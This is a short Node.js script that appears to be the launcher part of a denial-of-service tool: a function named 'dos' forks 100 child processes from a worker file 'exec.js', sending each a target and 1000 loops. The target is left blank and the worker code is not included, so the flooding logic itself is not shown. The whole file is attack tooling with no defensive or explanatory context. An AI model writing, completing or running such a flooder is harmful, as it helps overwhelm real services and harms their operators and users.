
const {fork} = require("child_process")
const target = "";

const threads = 100;
const loops = 1000;
async function dos(target,id) {
    let child = fork("./exec.js");
    child.send(JSON.stringify({target:target,loops:loops,id:id}));
    child.on("message",(msg)=>{
        console.log(msg);
    });
}
for (let i=0;i<threads;i++) {
    dos(target,i);
}